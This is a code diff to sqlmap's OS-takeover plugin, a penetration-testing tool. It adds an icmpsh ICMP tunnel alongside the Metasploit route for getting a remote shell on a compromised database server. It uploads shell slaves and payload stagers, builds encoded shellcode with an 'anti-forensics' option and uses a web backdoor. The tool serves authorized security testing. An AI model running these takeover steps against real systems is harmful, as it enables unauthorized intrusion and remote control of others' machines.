@@ -8,21 +8,24 @@ See the file 'doc/COPYING' for copying permission
 """
 
 from lib.core.common import readInput
+from lib.core.common import runningAsAdmin
 from lib.core.data import conf
 from lib.core.data import kb
 from lib.core.data import logger
 from lib.core.exception import sqlmapMissingMandatoryOptionException
+from lib.core.exception import sqlmapMissingPrivileges
 from lib.core.exception import sqlmapNotVulnerableException
 from lib.core.exception import sqlmapUndefinedMethod
 from lib.core.exception import sqlmapUnsupportedDBMSException
 from lib.takeover.abstraction import Abstraction
+from lib.takeover.icmpsh import ICMPsh
 from lib.takeover.metasploit import Metasploit
 from lib.takeover.registry import Registry
 from lib.techniques.outband.stacked import stackedTest
 
 from plugins.generic.misc import Miscellaneous
 
-class Takeover(Abstraction, Metasploit, Registry, Miscellaneous):
+class Takeover(Abstraction, Metasploit, ICMPsh, Registry, Miscellaneous):
     """
     This class defines generic OS takeover functionalities for plugins.
     """
@@ -32,6 +35,7 @@ class Takeover(Abstraction, Metasploit, Registry, Miscellaneous):
         self.tblField = "data"
 
         Abstraction.__init__(self)
+        ICMPsh.__init__(self)
 
     def osCmd(self):
         stackedTest()
@@ -84,63 +88,104 @@ class Takeover(Abstraction, Metasploit, Registry, Miscellaneous):
 
         stackedTest()
 
+        self.checkDbmsOs()
+
+        msg  = "how do you want to establish the tunnel?"
+        msg += "\n[1] TCP: Metasploit Framework (default)"
+        msg += "\n[2] ICMP: icmpsh - ICMP tunneling"
+
+        while True:
+            tunnel = readInput(msg, default=1)
+
+            if isinstance(tunnel, basestring) and tunnel.isdigit() and int(tunnel) in ( 1, 2 ):
+                tunnel = int(tunnel)
+                break
+
+            elif isinstance(tunnel, int) and tunnel in ( 1, 2 ):
+                break
+
+            else:
+                warnMsg = "invalid value, valid values are 1 and 2"
+                logger.warn(warnMsg)
+
+        if tunnel == 2 and kb.dbms != "Windows":
+                errMsg = "icmpsh slave is only supported on Windows at "
+                errMsg += "the moment. The back-end database server is "
+                errMsg += "not. sqlmap will fallback to TCP (Metasploit)"
+                logger.error(errMsg)
+
+                tunnel = 1
+
+        if tunnel == 2:
+            isAdmin = runningAsAdmin()
+
+            if isAdmin is not True:
+                errMsg  = "you need to run sqlmap as an administrator "
+                errMsg += "if you want to establish an out-of-band ICMP "
+                errMsg += "tunnel because icmpsh uses raw sockets to "
+                errMsg += "sniff and craft ICMP packets"
+                raise sqlmapMissingPrivileges, errMsg
+
         if kb.stackedTest or conf.direct:
             web = False
 
-            self.initEnv(web=web)
             self.getRemoteTempPath()
+            self.initEnv(web=web)
 
-            if kb.dbms in ( "MySQL", "PostgreSQL" ):
-                msg  = "how do you want to execute the Metasploit shellcode "
-                msg += "on the back-end database underlying operating system?"
-                msg += "\n[1] Via UDF 'sys_bineval' (in-memory way, anti-forensics, default)"
-                msg += "\n[2] Stand-alone payload stager (file system way)"
+            if tunnel == 1:
+                if kb.dbms in ( "MySQL", "PostgreSQL" ):
+                    msg  = "how do you want to execute the Metasploit shellcode "
+                    msg += "on the back-end database underlying operating system?"
+                    msg += "\n[1] Via UDF 'sys_bineval' (in-memory way, anti-forensics, default)"
+                    msg += "\n[2] Stand-alone payload stager (file system way)"
 
-                while True:
-                    choice = readInput(msg, default=1)
+                    while True:
+                        choice = readInput(msg, default=1)
 
-                    if isinstance(choice, basestring) and choice.isdigit() and int(choice) in ( 1, 2 ):
-                        choice = int(choice)
-                        break
+                        if isinstance(choice, basestring) and choice.isdigit() and int(choice) in ( 1, 2 ):
+                            choice = int(choice)
+                            break
 
-                    elif isinstance(choice, int) and choice in ( 1, 2 ):
-                        break
+                        elif isinstance(choice, int) and choice in ( 1, 2 ):
+                            break
 
-                    else:
-                        warnMsg = "invalid value, valid values are 1 and 2"
-                        logger.warn(warnMsg)
+                        else:
+                            warnMsg = "invalid value, valid values are 1 and 2"
+                            logger.warn(warnMsg)
 
-                if choice == 1:
-                    goUdf = True
+                    if choice == 1:
+                        goUdf = True
 
-            if goUdf:
-                self.createMsfShellcode(exitfunc="thread", format="raw", extra="BufferRegister=EAX", encode="x86/alpha_mixed")
-            else:
-                self.createMsfPayloadStager()
-                self.uploadMsfPayloadStager()
+                if goUdf:
+                    self.createMsfShellcode(exitfunc="thread", format="raw", extra="BufferRegister=EAX", encode="x86/alpha_mixed")
+                else:
+                    self.createMsfPayloadStager()
+                    self.uploadMsfPayloadStager()
 
-            if kb.os == "Windows" and conf.privEsc:
-                if kb.dbms == "MySQL":
-                    debugMsg  = "by default MySQL on Windows runs as SYSTEM "
-                    debugMsg += "user, no need to privilege escalate"
-                    logger.debug(debugMsg)
+                if kb.os == "Windows" and conf.privEsc:
+                    if kb.dbms == "MySQL":
+                        debugMsg  = "by default MySQL on Windows runs as SYSTEM "
+                        debugMsg += "user, no need to privilege escalate"
+                        logger.debug(debugMsg)
 
-            elif kb.os != "Windows" and conf.privEsc:
-                # Unset --priv-esc if the back-end DBMS underlying operating
-                # system is not Windows
-                conf.privEsc = False
+                elif kb.os != "Windows" and conf.privEsc:
+                    # Unset --priv-esc if the back-end DBMS underlying operating
+                    # system is not Windows
+                    conf.privEsc = False
 
-                warnMsg  = "sqlmap does not implement any operating system "
-                warnMsg += "user privilege escalation technique when the "
-                warnMsg += "back-end DBMS underlying system is not Windows"
-                logger.warn(warnMsg)
-
+                    warnMsg  = "sqlmap does not implement any operating system "
+                    warnMsg += "user privilege escalation technique when the "
+                    warnMsg += "back-end DBMS underlying system is not Windows"
+                    logger.warn(warnMsg)
+            elif tunnel == 2:
+                self.uploadIcmpshSlave(web=web)
+                self.icmpPwn()
+                
         elif not kb.stackedTest and kb.dbms == "MySQL":
-            infoMsg  = "going to use a web backdoor to execute the "
-            infoMsg += "payload stager"
-            logger.info(infoMsg)
-
             web = True
+
+            infoMsg = "going to use a web backdoor to establish the tunnel"
+            logger.info(infoMsg)
 
             self.initEnv(web=web)
 
@@ -156,18 +201,24 @@ class Takeover(Abstraction, Metasploit, Registry, Miscellaneous):
                     logger.warn(warnMsg)
 
                 self.getRemoteTempPath()
-                self.createMsfPayloadStager()
-                self.uploadMsfPayloadStager(web=True)
+
+                if tunnel == 1:
+                    self.createMsfPayloadStager()
+                    self.uploadMsfPayloadStager(web=web)
+                elif tunnel == 2:
+                    self.uploadIcmpshSlave(web=web)
+                    self.icmpPwn()
         else:
             errMsg  = "unable to prompt for an out-of-band session via "
             errMsg += "the back-end DBMS"
             raise sqlmapNotVulnerableException(errMsg)
 
-        if not web or (web and self.webBackdoorUrl is not None):
-            self.pwn(goUdf)
+        if tunnel == 1:
+            if not web or (web and self.webBackdoorUrl is not None):
+                self.pwn(goUdf)
 
-        if not conf.cleanup:
-            self.cleanup()
+            if not conf.cleanup:
+                self.cleanup()
 
     def osSmb(self):
         stackedTest()
